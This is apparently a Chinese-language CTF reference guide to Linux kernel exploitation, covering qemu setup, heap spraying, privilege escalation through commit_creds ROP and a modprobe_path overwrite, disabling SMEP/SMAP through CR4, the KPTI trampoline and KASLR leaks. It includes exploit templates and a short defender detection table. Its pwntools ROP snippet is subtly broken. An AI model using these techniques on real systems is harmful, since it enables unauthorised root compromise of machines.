# 内核 pwn：环境、原语与 SMEP/SMAP/KPTI 绕过

> 被 `pwn-chain` 引用。目标和用户态完全不同：**你要在 ring0 里执行**
> 所以一旦控制流跑偏就是 kernel panic（整机重启），而不是"进程崩一下"。
> 因此流程是：先搭可复现环境 → 再 leak → 再原语 → 最后提权。

## 一、环境搭建（决定后面一切）

### 1.1 必备文件

| 文件 | 从哪来 | 用途 |
| --- | --- | --- |
| `bzImage` | `/boot/vmlinuz-$(uname -r)` 或题目给 | 启动内核 |
| `vmlinux` | `/usr/lib/debug/boot/vmlinux-*` 或 `extract-vmlinux bzImage > vmlinux` | **带符号**，gdb 与 ROP 用 |
| `initramfs.cpio.gz` | 题目给 / 自己打包 | 根文件系统（含 vuln.ko） |
| `vuln.ko` | 题目给 | 目标驱动 |
| `run.sh` | 题目给 / 自己写 | qemu 启动脚本 |

```bash
# 从 bzImage 抽 vmlinux（没有 debug 包时）
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
file vmlinux            # 应是 "ELF 64-bit LSB executable, ... not stripped"

# 解 initramfs 看 init 脚本与 ko
mkdir rootfs && cd rootfs
zcat ../initramfs.cpio.gz | cpio -idmv
cat init                # 关键：看 whoami / setsuid / 权限
```

### 1.2 qemu 启动脚本（含可调保护）

```bash
#!/bin/sh
qemu-system-x86_64 \
  -m 256M \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio.gz \
  -nographic \
  -append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" \
  -cpu kvm64,+smep,+smap \
  -s
# -s        = gdb server on :1234
# -cpu kvm64,+smep,+smap   加 +smep/+smap 开启；去掉则关闭
# kaslr / nokaslr           决定是否随机化内核基址
# pti=on / pti=off          KPTI 开关（会影响能否直接 ret2usr）
```

| 保护 | 参数 | 关闭方式 | 影响 |
| --- | --- | --- | --- |
| SMEP | `+smep` | `-cpu kvm64,-smep` | 禁止内核执行用户态页 |
| SMAP | `+smap` | `-cpu kvm64,-smap` | 禁止内核访问用户态数据 |
| KASLR | `kaslr` | `nokaslr` | 内核基址随机化 |
| KPTI | `pti=on` | `pti=off` | 用户页不映射到内核页表 |
| PTI + PCID | 新版默认 on | `nopti` | 影响 swapgs 与 CR3 切换 |

**必须验证参数真的生效**（很多人以为开了其实没开）：

```bash
# 进入 qemu 后（CTF 的 init 通常给 root shell）
cat /proc/cmdline
grep -E "smep|smap" /proc/cpuinfo
dmesg | grep -iE "Kernel/User page tables isolation|KASLR"
cat /sys/module/kernel/parameters/* 2>/dev/null
```

### 1.3 gdb 联调

```bash
# 终端 A：启动 qemu（run.sh 里带 -s）
./run.sh

# 终端 B：连上
gdb -q ./vmlinux \
  -ex "target remote :1234" \
  -ex "set architecture i386:x86-64" \
  -ex "b *0xffffffff81000000" \
  -ex "c"
# 加载符号（若 vmlinux 与运行内核不匹配会错位）
# 常用：
#   p &init_cred / p &commit_creds / p &prepare_kernel_cred
#   x/20i $rip
#   info registers cr4       ← 看 SMEP/SMAP 位
```

```bash
# 关 KASLR 时可用固定偏移（最省事）
grep -E " (commit_creds|prepare_kernel_cred|modprobe_path)$" /proc/kallsyms
```

## 二、常见漏洞类型与利用路径

| 类型 | 触发 | 常见原语 | 首选目标对象 |
| --- | --- | --- | --- |
| 栈溢出（驱动 ioctl） | `copy_from_user` 到栈 buffer，长度可控 | 覆盖返回地址 → ROP | 直接 kROP |
| 堆溢出 / slab overflow | kmalloc 的对象越界写 | 覆盖相邻对象字段 | `tty_struct` / `msg_msg` / `pipe_buffer` |
| UAF | free 后指针未清 | 重分配 + 控字段 | `tty_struct`(ops) / `seq_operations` / `shm_file_data` |
| 竞态 | 多线程并发访问 | 状态错乱 → UAF/越界 | 视具体 |
| 整数溢出 | size 计算溢出 | 超大/超小分配 | 视具体 |
| 未初始化栈变量 | 读到内核栈残留 | 信息泄漏（KASLR bypass） | 无需 spraying |

### 2.1 常见目标对象表（slab 喷什么）

| 对象 | 大小 | 可控字段 | 用途 |
| --- | --- | --- | --- |
| `tty_struct` | ~0x2b8 | `ops`（vtable 指针） | 改 ops → 调 fake vtable（需 SMEP 处理） |
| `seq_operations` | 0x20 | 4 个函数指针 | 最简单的函数指针劫持 |
| `msg_msg` | 可变 | `m_ts`（长度）/ 数据 | 任意读（越界读 msg） |
| `pipe_buffer` | 0x28 | `ops` / `page` / `offset`/`len` | 改 ops 或 page → 任意读写 |
| `sk_buff` | 可变 | 数据区 | 堆喷数据 |
| `shm_file_data` | 0x20 | `file` 指针 | 泄漏/伪造 |
| `file` / `seq_file` | 大 | `f_op` | 变体 |
| `cred` | 0xa8 | uid/gid/caps | **提权目标**（直接改） |

```c
// 用户态喷 seq_operations 的经典做法（配合 UAF 覆盖）
int fds[N];
for (int i = 0; i < N; i++) fds[i] = open("/proc/self/stat", O_RDONLY);
// 每次 open 分配一个 seq_operations（0x20），内容固定为 4 个函数指针
// UAF 后重分配同 size → 对象落在刚 free 的位置
```

### 2.2 提权原语

| 原语 | 做法 | 前提 |
| --- | --- | --- |
| `commit_creds(prepare_kernel_cred(0))` | 标准 kROP | 能 ROP |
| 改 `cred` 结构 | 找到当前 task_struct → cred → 把 uid/cap 清 0 | 有任意写 + 地址已知 |
| 改 `modprobe_path` | 写 `/tmp/x`，触发未知二进制执行 | 有任意写 + KASLR 已 leak |
| 改 `core_pattern` | 写 `\|/tmp/x %p`，触发 core dump | 同上，且需可触发 crash |
| 改 `poweroff_cmd` | 写命令 + 触发关机 | 较少用 |
| 覆盖 `selinux_enforcing` | 关 SELinux | 特定环境 |

```c
// modprobe_path 触发（用户态）
// 1) 写 /tmp/x：#!/bin/sh\nchmod 777 /flag\n
// 2) 造一个"未知格式"的可执行文件并运行 → 内核调 modprobe 处理 → 执行 /tmp/x
int fd = open("/tmp/dummy", O_WRONLY|O_CREAT, 0777);
write(fd, "\xff\xff\xff\xff", 4);   // 非法 magic
close(fd);
system("/tmp/dummy");               // 触发 request_module
// 注意：需要 CONFIG_MODULES=y 且 modprobe_path 可写
```

## 三、SMEP / SMAP / KPTI 绕过

### 3.1 先确认保护状态

```bash
# 在目标里（root shell）
cat /proc/cpuinfo | grep -o "smep\|smap" | sort -u
# gdb 里看 CR4
(gdb) p/x $cr4
# bit 20 = SMEP, bit 21 = SMAP
```

| 位 | 含义 | 关掉后的能力 |
| --- | --- | --- |
| CR4[20] SMEP | 内核不能执行用户页 | 关掉可 `ret2usr`（直接返回到用户态 shellcode） |
| CR4[21] SMAP | 内核不能读写用户页 | 关掉可直接用用户态数据做 fake 结构 |
| CR3 切换（KPTI） | 用户页在内核态不映射 | 关掉可 ret2usr 且用户栈可读 |

### 3.2 关 SMEP/SMAP（最省事的原生语）

```text
需要一段"native write cr4"的 gadget：
  mov cr4, rdi ; ret
  pop rdi ; ret
  （有时是 mov cr4, rax 或 mov cr4, rXX）
先 ROP 到：
  pop rdi; ret
  0x6f0 或 0x406f0      ← 清掉 bit20/21（原 CR4 值 & ~(1<<20|1<<21)）
  mov cr4, rdi; ret
  然后 ret2usr
```

```python
# 注意：0x6f0 不是通用值，要读实际 cr4 再算
# 常见默认 CR4 = 0x1406e0 / 0x406f0 / 0x6f0，务必从 gdb 的 p/x $cr4 取
```

### 3.3 KPTI 绕过（内核态回用户态）

KPTI 开着时，内核页表里没有用户页映射 → 直接 `ret` 到用户地址会 page fault。
必须走 **KPTI trampoline**：

```text
swapgs_restore_regs_and_return_to_usermode
  +22 处（跳过 pop r15..rdi 的那段）：
    直接到 mov rdi, rsp; ... iretq 的部分

payload 形态：
  ... ROP 链 ...
  kpti_trampoline + 22
  0                      ← 占位 (rax)
  0                      ← 占位 (rdi)
  user_rip               ← 你要回到的用户态函数（如 get_shell）
  user_cs                ← 0x33（64 位用户代码段）
  user_rflags            ← 0x202 或保存的 rflags
  user_rsp               ← 用户栈地址
  user_ss                ← 0x2b
```

```c
// 用户态保存现场（必须在触发漏洞前调）
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :: "memory");
}
```

| 偏移获取方式 | 命令 |
| --- | --- |
| 符号地址 | `grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms` |
| +22 偏移 | 反汇编该函数，找 `mov rdi, rsp` 或 `pop r15` 之后的位置（**各版本不同，必须现看**） |
| 老方法 | `swapgs; iretq` 直接手搓（KPTI 下不可用） |

```bash
# 确认 trampoline 偏移（本地 vmlinux）
objdump -d ./vmlinux --start-address=$(nm vmlinux | grep swapgs_restore_regs | awk '{print "0x"$1}') \
  --stop-address=+0x80 | head -30
```

### 3.4 绕过 SMAP 的替代（不关 CR4）

- 用 `copy_from_user` / `copy_to_user` 做数据搬运（内核合法访问用户内存）
- 把 fake 结构放在**内核可控内存**（堆喷数据），不依赖用户页
- `set_memory_x` 类族改页属性（少见）

## 四、exp 模板结构（可直接套）

```c
// 通用骨架：保存现场 → 触发 → 提权 → 回用户态 → 拿 shell
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() { /* 见上 */ }
void win() {
    // 提权后：读 flag / 起 shell
    system("cat /flag; /bin/sh");
}

int main() {
    save_state();
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // 1) 触发漏洞（示例：ioctl 越界）
    char buf[0x100] = {0};
    ioctl(fd, 0x1337, buf);

    // 2) ROP（示例，地址需按实际内核计算）
    // ...

    return 0;
}
```

```python
# 用 pwntools 生成 ROP 数据的辅助（把 C 里的常量算出来）
from pwn import *
context.arch = 'amd64'
kbase = 0xffffffff81000000        # nokaslr 时的基址
rop  = kbase + 0x0a2b4a           # pop rdi; ret
rop += 0
rop += kbase + 0x0a2b4a           # prepare_kernel_cred 参数（0）
```

**exp 稳定性的三个硬要求**：

| 要求 | 做法 |
| --- | --- |
| 不 panic | 所有内核地址必须有效；不访问未映射页 |
| 可重复 | UAF 的对象重分配要确定性（用 `msg_msg` 同 size 喷，不用随机） |
| 不乱序 | 先 leak 再 spray 再触发，顺序错了堆状态就变 |

## 五、KASLR leak 手段

| 手段 | 前提 | 说明 |
| --- | --- | --- |
| `/proc/kallsyms` | `kptr_restrict=0` | 最直接；CTF 常见，真实环境常被限 |
| 未初始化栈/堆 | 有信息泄漏接口 | 读到内核地址 |
| `dmesg` | 可读 dmesg | 内核日志里有地址 |
| `msg_msg` 越界读 | UAF/越界 | 读相邻对象的指针 |
| `seq_operations` 残留 | UAF | 对象内含内核函数指针 |
| `perf_event_open` 等已知泄漏 CVE | 特定版本 | 真实环境用 |

```bash
# 检查限制
cat /proc/sys/kernel/kptr_restrict     # 0=可读 1=仅 root 2=全隐藏
cat /proc/sys/kernel/dmesg_restrict
cat /proc/sys/kernel/perf_event_paranoid
```

**KASLR 计算**：

```python
# 已知某符号的运行时地址 → 算基址
leaked = 0xffffffff81234567
sym_off = 0x1234567            # 来自 vmlinux 的 nm 输出
kbase = leaked - sym_off
assert kbase & 0xfffff == 0    # 内核基址 2MB 对齐（x86-64）
# → 所有符号 = kbase + off
```

## 六、调试实战（panic 分析）

```bash
# qemu 崩了会打印 panic，关键是这三行
#   RIP: 0010:some_func+0x1a/0x30
#   Call Trace:
#   Code: ...
# 结合 vmlinux 反汇编定位
objdump -d ./vmlinux --start-address=0xffffffff81234560 --stop-address=0xffffffff812345a0
```

| panic 信息 | 含义 |
| --- | --- |
| `BUG: unable to handle page fault for address: 00000000...` | 解引用 NULL 或坏地址 |
| `kernel tried to execute NX-protected page` | SMEP 生效（想执行用户页） |
| `supervisor read access in kernel mode` | SMAP 生效（读了用户页） |
| `general protection fault` | 段错误/非规范地址 |
| `kernel BUG at ...` | 断言失败（`BUG_ON`） |

## 七、检测视角（防守方 / 真实环境）

| 手法 | 信号 |
| --- | --- |
| 内核模块加载 | `dmesg` 的 `module verification failed` / `tainting kernel` |
| 提权 | `auditd` 记录 `setuid` 到 0 的异常进程；`/proc/<pid>/status` 的 Uid 变化 |
| `modprobe_path` 改 | `/proc/sys/kernel/modprobe` 内容变化（若可读）；`call_usermodehelper` 执行陌生路径 |
| cred 覆盖 | 无直接日志，但 `capability` 提升 + 无对应 `execve` 是异常组合 |
| kernel panic | 系统重启 + `/var/log/kern.log` 的 oops |

> 真实环境中内核利用**必然留下 panic 风险**，红队 OPSEC 上通常避免，
> 只在 CTF / 授权渗透的目标机允许内核提权。

## 八、验伤信号

| 声称 | 证据 |
| --- | --- |
| "保护识别正确" | `cat /proc/cmdline` 原文 + `grep smep /proc/cpuinfo` 结果 |
| "leak 了内核基址" | 基址 **2MB 对齐**，且 `kbase + 符号偏移` 能对上另一个已知符号 |
| "拿到 root" | `id` 输出 `uid=0(root)`，且 **`cat /flag` 成功** |
| "exp 稳定" | 连续 20 次重启 + 运行全成功（内核 pwn 一次崩就要重启） |

**反例（看起来成功其实是假）**：

- `id` 显示 `uid=0` 但 `cat /flag` 报 `Permission denied` → 只改了 `cred->uid`，
  没改 `euid`/`fsuid`/`cap_*`；或者 flag 属于别的容器
- 本地能提权、远程 panic → 远程多开了 KASLR/SMEP，本地参数是 `-smep`
- "ROP 链通"但只执行了一部分 → 栈上的链被内核栈对齐/`swapgs` 破坏
- 用 `-s` 调试时成功，去掉 `-s` 失败 → gdb 附加会改时序（竞态题尤其明显）

## 九、常见坑

1. **vmlinux 与 bzImage 不匹配**——偏移全错，ROP 直接 panic。
   `extract-vmlinux` 从**同一份** bzImage 抽。
2. **以为 SMEP 关了其实没关**——`-cpu kvm64` 默认不带 `+smep`，
   但题目 run.sh 里可能加了。必须进系统验证 `cr4` 或 `/proc/cpuinfo`。
3. **KPTI 偏移 "+22" 照抄**——不同内核版本 trampoline 位置不同，
   必须反汇编现看（找 `mov rdi, rsp` 前的 `pop r15` 序列）。
4. **spray 用的对象 size 不对**——kmalloc 有 8/16/32/64/96/128/192/256...
   多档，`kmalloc-64` 的对象不能喷进 `kmalloc-96`。用 `cat /proc/slabinfo` 确认。
5. **UAF 后重分配不稳定**——堆喷要"多次、同 size、先占满"，一次分配就指望落在原位是赌博。
6. **竞态题用单线程调试**——gdb 附加改变时序，`-s` 时通、正常跑不通。用 `-snapshot` 或
   在 exp 里加 `usleep` 调窗口。
7. **`modprobe_path` 触发失败**——需要 `CONFIG_MODULES=y` 且确实有未知格式执行；
   容器里可能连 `/sbin/modprobe` 都没有。